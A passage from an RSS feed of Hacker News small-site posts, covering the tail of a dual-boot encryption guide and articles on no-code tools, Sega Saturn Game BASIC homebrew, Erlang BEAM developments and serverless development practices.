going to leave some unallocated space to install Linux later. This is a good
approach because the Windows installer will mess with our partitions a little
bit, and its easier to let it do so before finalizing our Linux partitions.</p>

<p><img src="https://www.mikekasberg.com/images/dual-boot-encryption/windows-installer.jpg" alt="The Windows installer"></p>

<ol>
  <li>Boot from your Windows Installer USB stick.</li>
  <li>Choose a <code>Custom (advanced)</code> install to get to the Windows partitioning tool.</li>
  <li>Create a new partition. The size of this partition should be the amount of
disk space you want to use for Windows. In this example, I did 80G since the SSD
on my computer is relatively small. If unsure, do about half of your hard
disk.</li>
  <li>Windows will warn you that it is going to create an extra system partition.
This is good.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
  <li>Install Windows onto the partition you just made. There’s no need to format
any partitions – the Windows installer will take care of that for you.</li>
  <li>When the Windows installation is finished, log in and enable BitLocker on
drive <code>C:</code>. This will automatically create yet another partition on your disk
(a Windows recovery partition) - which is why we’re doing it before
partitioning for Ubuntu.</li>
</ol>

<p>At this point, you can start using Windows. But I’d avoid doing too much setup
or personalization yet so you don’t have to do it again if something goes wrong
below. If you want to double check your partitions, this is what you’ll be left
with after installing Windows and enabling BitLocker:</p>

<div><div><pre><code>ubuntu@ubuntu:~$ sudo sgdisk --print /dev/sda
Disk /dev/sda: 500118192 sectors, 238.5 GiB

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048         1128447   550.0 MiB   EF00  EFI
   2         1128448         1161215   16.0 MiB    0C01  Microsoft reserved ...
   3         1161216       167825076   79.5 GiB    0700  Basic data partition
   4       167825408       168900607   525.0 MiB   2700
</code></pre></div></div>

<h2 id="phase-3-partition-the-drive-for-ubuntu">Phase 3: Partition the drive for Ubuntu</h2>

<p>This is the trickiest phase since this is where we need to manually set up our
encrypted disks for Ubuntu. We’re going to make it work very similar to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html">https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html</a></em></p>]]>
            </description>
            <link>https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24914573</guid>
            <pubDate>Wed, 28 Oct 2020 02:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When is no-code useful?]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 46 (<a href="https://news.ycombinator.com/item?id=24914062">thread link</a>) | @thesephist
<br/>
October 27, 2020 | https://linus.coffee/note/no-code/ | <a href="https://web.archive.org/web/*/https://linus.coffee/note/no-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>To talk about what no-code is good for, we need to first take a digression on what makes no-code fundamentally different from “yes-code” software.</p>
<h2 id="the-grain-of-abstractions">The grain of abstractions</h2>
<p>Software – yes-code software – has been around for a while. One of the things we’ve learned as an industry is how to write software <em>that gracefully evolves</em>. We’re not perfect – sad, legacy systems still proliferate – but we as a technical industry have learned how to build and evolve software systems against changing requirements and constraints that span years and decades.</p>
<p>When we first solve a problem with software, we write some code against the constraints of that particular day. We don’t necessarily know how the problem is going to change. Maybe there will be different customers or stakeholders tomorrow, or maybe the product will expand to serve a related, but different, problem space. We need to be able to change software to accommodate changing circumstances without rewriting it, and that is fundamentally what <em>software engineering</em> is: how to change software systems. <em>Change</em> is the name of the game.</p>
<p>We’ve gotten decent at change. We’ve built tools like Git and patterns like continuous integration and code autoformatting to make it easier to change code and remain stable. We’ve learned how to operate large software teams, especially in open source. We’ve also learned to use better abstractions. Abstractions are conceptual wrappers that isolate different parts of a codebase – say, a data source from a user interface – so that one part may change while another doesn’t. In general we have started to figure out how to make the DNA of software systems resilient against the changing tides of time.</p>
<p>No-code seems to reject a lot of those learnings, for better or worse. I haven’t seen any no-code company or product that allows source control (and I’ve seen many no-code companies, but you’re welcome to prove me wrong.) I have yet to find no-code products that allow for natural construction of abstraction between layers of a no-code workflow. No-code software is also scarily ill-prepared for large scale development: we have software systems being worked on by tens of thousands of engineers – what does it look like for a team of 1000 engineers to be working on a set of thousands of no-code workflows? Chaos.</p>
<blockquote>
<p>Traditional software has learned the abstractions and patterns that make software resilient and adaptable to change and scale. No-code software is not ready for changing constraints nor development scale.</p>
</blockquote>
<p>Despite these limitations, I think no-code has a few niches where making tradeoffs in adaptability and scale allows no-code tools to be much, much better. So, given this, <em>when is no-code useful?</em></p>
<h2 id="1-transitionary-ephemeral-software">1. Transitionary, ephemeral software</h2>
<p>The obvious answer, and one I had before our conversation, was <em>transitionary</em> software, software with <em>a defined lifetime</em>. If your software system has a finite, pre-defined lifetime and team, it doesn’t need to worry about changing constraints or team growth. It just needs to worry about solving a problem well, now.</p>
<p>Lots of software has predictably finite lifetime: a product prototype for an early-stage company, a game or app used as a part of an interactive online ad, a quick sketch or solution to patch a particularly urgent problem in a product, an app built for an event or a conference or a recruiting cycle or a quarterly goal tracker… all of these are projects with a pre-defined, maximum lifetime. They don’t need to last or grow or change – they just need to work now, and by giving up some of the adaptability of software abstractions of code, no-code software benefits from way faster prototyping speed. This is a plus.</p>
<p>I think we see lots of finite-time software in transitions. Transitions from having no product to having a product, in a prototype. Transitions in the process of brainstorming a solution and trying multiple designs. Software with a finite shelf life is a good fit for no-code tools.</p>
<h2 id="2-high-churn-code">2. High-churn code</h2>
<p>There’s another category of software for which long-term maintainability matters little – code with high churn.</p>
<p>By high churn, I mean that requirements are changing almost daily, and very little of the code written today will exist in a month or a quarter’s time. If the code you write today doesn’t have to last and evolve, because something new is going to take its place tomorrow, what matters is the speed to build, not resilience to change.</p>
<p>There’s lots of high-churn code in businesses. Marketing websites and landing pages, data pipelines for analytics, e-commerce storefronts, marketing campaigns, payment portals – requirements for these kinds of solutions change quickly enough that code is constantly being rewritten, and if code needs to <em>be replaced</em> more than it needs to <em>last</em>, no-code tools are a great fit.</p>
<h2 id="avoiding-the-same-mistakes">Avoiding the same mistakes</h2>
<p>I think “no-code” is a misnomer. It leads us to think that no-code software is the start of a trend in which general software will involve less coding, and software engineering will become easier. This is not the case. Software engineering is not about building solutions, it’s about evolving them. But change resiliency over time is not the focus of no-code tools, and I think that’s ok.</p>
<p>I think no-code tools are instead an extension of a different trend: <a href="https://thesephist.com/posts/text/">reifying workflows</a>. Business processes and workflows used to be documented in Word docs strewn about the office or on a shared folder, or even just passed down by oral tradition in companies. Now, we have tools that allow us to build these workflows, talk about them, edit them, and share them more concretely. This is a huge boon for more repeatable business processes and for getting things done quickly! I think this is the true win of no-code tools: concretizing workflows.</p>
<p>If no-code wants to be a serious competitor against “traditional” software – though I don’t think it should try – no-code needs to learn from the mistakes of early software. No-code tools need to understand that products and software systems need to live on for decades against changing teams and requirements, and against products and companies and standards that die out and get replaced. This requires a cultural shift, a tooling shift, and a new class of abstractions in our toolbelt as no-code engineers. Anytime we try to introduce more tooling and abstraction to no-code, I think no-code gets just a little more “code” in it. And perhaps that’ll bring us right back to where we started, discovering that code is good.</p>
<p>After all, the world is complex. And when we build software against the complexity of the world, that <a href="https://thesephist.com/posts/complexity-conservation/">complexity needs to go somewhere</a>. Software is complex, but only as much as the world it attempts to make sense of.</p>
<p>It feels like we’re getting off the edge of a discovery phase of no-code, and into a time when we’re starting to understand what problems no-code tools are great for. I think it’s important that no-code tool builders focus on those strengths, or risk falling into the trap of repeating the software industry’s mistakes from the ground up.</p>

        <hr>
        <p>
            
            Next:
            <a href="https://linus.coffee/note/scannability/"><em>Scannability is king</em></a>
            
        </p>
    </article></div>]]>
            </description>
            <link>https://linus.coffee/note/no-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24914062</guid>
            <pubDate>Wed, 28 Oct 2020 01:36:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sega Saturn Homebrew with Game Basic]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24913598">thread link</a>) | @lostgame
<br/>
October 27, 2020 | https://flybacklabs.com/sega-saturn-homebrew-with-game-basic/ | <a href="https://web.archive.org/web/*/https://flybacklabs.com/sega-saturn-homebrew-with-game-basic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-6">
		<!-- .entry-header -->

	
	<div>
		
	
<figure><img data-attachment-id="123" data-permalink="https://flybacklabs.com/sega-saturn-homebrew-with-game-basic/game-basic-for-sega-saturn-2/" data-orig-file="https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn.jpg" data-orig-size="2560,1920" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone SE (2nd generation)&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1602104707&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;500&quot;,&quot;shutter_speed&quot;:&quot;0.033333333333333&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Game BASIC for Sega Saturn" data-image-description="" data-medium-file="https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-300x225.jpg" data-large-file="https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-1024x768.jpg" loading="lazy" width="1024" height="768" src="https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-1024x768.jpg" alt="Sega Saturn for Game BASIC - Complete in Box" srcset="https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-1024x768.jpg 1024w, https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-300x225.jpg 300w, https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-768x576.jpg 768w, https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-1536x1152.jpg 1536w, https://flybacklabs.com/wp-content/uploads/2020/10/game-basic-for-sega-saturn-2048x1536.jpg 2048w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"><figcaption>Game BASIC for Sega Saturn – Complete in Box</figcaption></figure>



<h2>Part 1: Introduction</h2>



<h3>Summary</h3>



<p>Game BASIC for Sega Saturn is a homebrew development kit that allows you to program games for the Sega Saturn using the BASIC programming language.&nbsp; If you’re familiar with the PlayStation’s Net Yaroze platform, think of this as the Saturn’s answer to it – just cheaper and easier to get started with.</p>



<p>Game BASIC’s use of the BASIC language makes for a very low barrier to entry in terms of programming skill.&nbsp; Though the Saturn is notoriously difficult to program for, Game BASIC makes it easy to get started and is surprisingly powerful, allowing very easy sprite manipulation and straightforward 3D polygon implementation.&nbsp; It even includes an adapter cable that allows you to communicate with the Saturn from your PC to transfer or save programs and streamline development.  For example, here’s a Pilotwings-esque demo, but in Game BASIC:</p>



<figure><p>
<iframe title="Game Basic for Sega Saturn - GBSS CD - Jump Multi Controller" width="525" height="394" src="https://www.youtube.com/embed/jMPksluhvlE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p><figcaption>“Jump” demo, provided with Game BASIC (video courtesy <a href="https://www.satakore.com/sega-saturn-game-basic,,GBSSCD_G_JUMP_A,,GBSS-CD-Jump-Multi-Controller-Version-Bits-Laboratory.html" target="_blank" rel="noreferrer noopener">Satakore.com</a>)</figcaption></figure>



<p>The caveat?&nbsp; Game BASIC was released only in Japan, so this means a complete setup can be difficult to obtain and all documentation is in Japanese!&nbsp; Moreover, the supporting software that allows you to use your PC for streamlined development was intended for the Windows 95 era and flat out does not install on modern systems. Oh, and the adapter cable that allows you to connect your Saturn to your PC is a 25-pin serial connection!</p>



<p>Who in the world still has both Game BASIC and a Windows 95 PC with a physical serial port? Nobody!&nbsp; (Well, unless you’re <a href="https://www.youtube.com/watch?v=O_QU8eaMymo" target="_blank" rel="noreferrer noopener">Modern Vintage Gamer</a>) But if you’re a brave experimenter who’s not afraid to tinker a bit, there are still multiple options to get everything working, even today!&nbsp; You can even do a lot just via emulation.&nbsp; So, let’s head to the Lab and get started…</p>



<h3>What You’ll Need</h3>



<p>There are several options for working with Game BASIC, ranging from quite simple but clunky to work with, to quite powerful and streamlined.&nbsp; Here are the three options:</p>



<h4>The Simple Saturn-only setup</h4>



<h5>Required Tools</h5>



<ul><li>A copy of the <a href="https://archive.org/details/game-basic-for-sega-saturn" target="_blank" rel="noreferrer noopener">Game BASIC for Sega Saturn disc</a></li><li>The ability to play Japanese Saturn games (A Japanese or modded console, a Pro Action Replay/<a href="https://ppcenter.webou.net/pskai/" target="_blank" rel="noreferrer noopener">Pseudo Saturn Kai</a> cartridge, or a Saturn emulator)</li><li>Any Saturn controller</li><li>Plenty of room in the Saturn’s internal memory (if you want to save your programs)</li></ul>



<p>For this option, you’ll run Game BASIC on the Saturn with no PC connection, using only standard Saturn accessories.&nbsp; This is a reasonable choice if you just want to write “Hello, World!”-style programs or play around with the neat games and demos that come with the kit.&nbsp; Theoretically, you can write even the most complex programs this way, but you’ll run into limitations on the size of games you can save to the Saturn’s internal memory.&nbsp; Plus, programming with a virtual keyboard is an absolute pain.&nbsp; Start here if you don’t have the necessary hardware for the other options, or if you just want to poke around a bit and see what this is all about.</p>



<h4>The Enhanced Saturn-only setup</h4>



<h5>Required Tools</h5>



<ul><li>All of the tools from Option 1, PLUS</li><li>Some kind of external expanded memory, such as:<ul><li>A direct-save memory cartridge (e.g., the official Saturn Backup Memory)</li></ul><ul><li>A Sega Saturn Floppy Disk Drive and some 3.5″ floppy disks</li></ul></li><li>A Sega Saturn keyboard OR the NetLink keyboard adapter with a PS/2 keyboard</li><li>Fun peripherals, like the Stunner light gun, 3D Control Pad, multi-tap, and Shuttle Mouse</li></ul>



<p>One of the great things about Game BASIC is how easy it makes it to access the Saturn’s peripherals, including the internal backup RAM, external memory cartridges, and even the Saturn Floppy Disk Drive.&nbsp; With a setup like this, you’ll have plenty of space to save your programs and you can use a real keyboard for text entry.&nbsp; You can even start experimenting with different forms of input, like analog controls and light guns!&nbsp; But without access to the tools a PC provides, it will be difficult to make nice-looking sprites, textures, and 3D models.&nbsp; So, this will still limit what you’re capable of.&nbsp; Regardless, this is a great option for the sheer fun factor of “Hey look! I’m programming with my Saturn!” or if you have no ability to connect your Saturn to a PC.</p>



<p>You can even go this route with a Saturn emulator, giving you easy access to improved keyboard, mouse, and storage options.&nbsp; I’ve confirmed that Mednafen successfully emulates Game BASIC and allows for keyboard and mouse pass-through input, meaning you can do a whole lot of Saturn development with very little barrier to entry.</p>



<h4>The Full Saturn plus PC Setup</h4>



<h5>Required Tools</h5>



<ul><li>A complete Game BASIC for Sega Saturn kit, including:<ul><li>A copy of the <a rel="noreferrer noopener" href="https://archive.org/details/game-basic-for-sega-saturn" target="_blank">Game BASIC for Sega Saturn disc</a></li></ul><ul><li>A copy of the <a rel="noreferrer noopener" href="https://archive.org/details/game-basic-for-sega-saturn" target="_blank">Windows 95 Tools disc</a></li></ul><ul><li>The special Saturn-to-PC serial cable adapter</li></ul></li><li>A modern PC with a USB port, capable of running a Virtual Machine (I use VirtualBox)</li><li>A copy of Windows XP SP3 32-bit to install on a VM</li><li>A <a href="https://www.amazon.com/USB-Serial-Adapter-Prolific-PL-2303/dp/B003WOWBBW" target="_blank" rel="noreferrer noopener">USB-to-Serial adapter</a> (Must support RS232 with a DB25 connector)</li><li>The ability to play Japanese Saturn games on original hardware (Japanese or modded console, or a Pro Action Replay/Pseudo Saturn Kai cartridge)</li><li>A Saturn controller</li><li>Optionally, any fun Saturn accessories you may want to experiment with (I especially recommend a keyboard or keyboard adapter)</li></ul>



<p>This is the Cadillac option!&nbsp; This is the setup I use, is how Game BASIC was really intended to be used (well, except nobody expected it to be run on a VM, I suppose), and is what the rest of this guide will focus on.&nbsp; With this setup, writing a game is as simple as writing BASIC in a text editor and hitting a couple of buttons to send it to your Saturn, where it immediately shows up on your TV and responds to controller and keyboard input!&nbsp; Seriously, it’s super cool once you get it working…</p>



<p>The Simple and Enhanced Saturn-only setups are extremely straightforward.&nbsp; You just boot Game BASIC like any other Saturn game and get started, so there’s not much configuration to discuss.&nbsp; Regardless of the setup you choose, continue on to Part 2 for a few test programs.&nbsp; But if you want the Full setup, it’s quite a project to get going, so read on to Part 3 for the complete How-To!</p>


<nav role="navigation"><!-- .nav-links --></nav><!-- .mpp-post-navigation -->	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://flybacklabs.com/sega-saturn-homebrew-with-game-basic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24913598</guid>
            <pubDate>Wed, 28 Oct 2020 00:22:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Beam Marches Forward]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24912808">thread link</a>) | @zdw
<br/>
October 27, 2020 | https://underjord.io/the-beam-marches-forward.html | <a href="https://web.archive.org/web/*/https://underjord.io/the-beam-marches-forward.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-10-26</small>
        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don’t know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn’t exist without the BEAM. With that bit of background I’d like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I’ve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I’ve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application “get to IO, don’t compute”. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn’t compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don’t think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It’s probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I’ve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I’m a hardware hobbyist, not an IoT dev but I’ve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that’s a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Saša Jurić, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I’ve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn’t replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don’t actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we’d otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don’t. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn’t BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn’t be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://underjord.io/the-beam-marches-forward.html">https://underjord.io/the-beam-marches-forward.html</a></em></p>]]>
            </description>
            <link>https://underjord.io/the-beam-marches-forward.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24912808</guid>
            <pubDate>Tue, 27 Oct 2020 22:33:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Five practices for serverless and distributed systems productivity]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24912370">thread link</a>) | @wfaler
<br/>
October 27, 2020 | https://chaordic.io/blog/serverless-distributed-system-productivity/ | <a href="https://web.archive.org/web/*/https://chaordic.io/blog/serverless-distributed-system-productivity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    
                  <p><img src="https://chaordic-public.s3.eu-central-1.amazonaws.com/images/productivity-1995786_960_720.jpg" alt=""></p>
<p>To productively build serverless &amp; distributed systems, we need to adopt new practices, some which may seem counterintuitive at first. This post will suggest five concrete practices to up your game.</p>
<p>Let’s jump in, roughly in order of importance:</p>
<h4 id="1-prefer-running-your-system-in-the-cloud-over-local-emulation">1. Prefer running your system in the cloud over local emulation</h4>
<p>Local development is sacred cow for many developers, being able to deploy, run and test an application or system on your laptop. But the reality of modern distributed systems is that some things cannot easily be emulated locally, if at all.</p>
<p>It is not for a lack of trying: systems running on Kubernetes are often emulated with Docker Compose or Minikube, with varying levels of success. For AWS Serverless, we have AWS SAM and LocalStack.</p>
<p>There are however a few issues with this type of emulation:</p>
<ul>
<li>The cost of maintaining emulation is high, since you effectively maintain two stacks - one for local development, and one for “real” deployment.</li>
<li>Emulation isn’t the real thing: you will find configuration drift, small or large differences in the behaviour of your stack.</li>
</ul>
<p>In summary, our experience of trying to maintain emulation is that the costs far outweigh the benefits. That effort should instead be put towards the ability to deploy local code quickly to the cloud environment, or where possible, connect a locally running process to a real environment in the cloud.</p>
<p>One of the great benefits of Serverless in particular, is that the cost of creating and provisioning <em>Feature Environments</em> is approaching zero. Moving local development to the cloud is a low-cost proposition.</p>
<h4 id="2-cicd-pipelines-are-not-enough-local-deployment-automation-is-crucial">2. CI/CD Pipelines are not enough, local deployment automation is crucial</h4>
<p>Given our stance on local emulation, the next instinct to suppress is that of relying on CI/CD to manage deployments to feature environments. If we rely entirely on CI pipelines for our ongoing development work, we end up wasting large amounts of time waiting for CI pipelines to build and deploy.</p>
<p>If instead, CI &amp; local development workflows can share as much as possible of deployment infrastructure, we should be able to reduce/remove this bottleneck on development, while also minimizing the duplicated effort of maintaining two types of automation.</p>
<p>In summary, any developer should trivially be able to:</p>
<ul>
<li>Deploy or connect locally built resources to their own feature environment in seconds with a single command from their laptop.</li>
<li>Deploy only the unit of deployment which has changed.</li>
<li>Have a development experience that is practically indistinguishable from “local development”.</li>
</ul>
<h4 id="3-for-aws-serverless--function-as-a-service---monolithic-functions-are-ok">3. For AWS Serverless &amp; “Function-as-a-Service” - monolithic functions are OK</h4>
<p>The first thing many teams do when they first start using AWS Lambda, is that they create separate deployable functions for every type of function invocation. For instance, a REST API gets a function for every single endpoint on the API. However, if you think in terms of <em>Domain Driven Design</em>, this might mean you end up with a number of functions that logically make up a single <em>Bounded Context</em>.</p>
<p>There are also practical considerations: as an example, AWS CloudFormation has a default limit of maximum 200 resources per stack. When you start adding up the multiplicative effect of the resources required for a Serverless application, you quickly realise that this is a limit that can be easily reached. Sticking to a service per Bounded Context, that acts as the target for multiple types of Lambda invocations is a sensible thing to do. Doing this will also reduce the automation and coordination overhead.</p>
<h4 id="4-consider-adopting-a-monorepo-with-tooling-appropriate-for-monorepos">4. Consider adopting a monorepo, with tooling appropriate for monorepos</h4>
<p>Let us start with a caveat emptor: monorepos without using appropriate tooling can be a disaster of slow CI pipelines &amp; low productivity. The upside is that some amazing and battle-tested tooling for monorepos exist these days (a personal favourite is <a href="https://bazel.build/">Bazel</a>, which originated from Google).</p>
<p>Without a monorepo, building distributed systems can be painful.</p>
<p>With dozens of repositories, code navigation for larger changes spanning multiple services become painful. Another thing that quickly becomes painful is dependency management, code sharing &amp; reuse. It is not uncommon to find that different components have different, mutually incompatible dependencies, which become painful to upgrade.</p>
<p>A monorepo negates these pains, while also making things such as security audits easier to conduct and address.</p>
<p>However, to avoid the “rebuild the universe” problem with monorepos, you need tooling that solves three problems:</p>
<ul>
<li>Change detection &amp; dependency-graph tracking.</li>
<li>Dependency-graph based rebuilds (rebuild only what has changed and what is invalidated by the change).</li>
<li>Build caching.</li>
</ul>
<h4 id="5-implement-all-three-pillars-of-observability">5. Implement all three pillars of observability</h4>
<p>Observability in control theory is defined as the ability to infer the internal state of a system by from knowledge about its external outputs. In practice, this is the triumvirate of event logs (log aggregation &amp; analytics), metrics (for alerting) &amp; tracing (driving visualization). Most organizations today skew heavily towards event logs only, with maybe some metrics, but very few do all three well.</p>
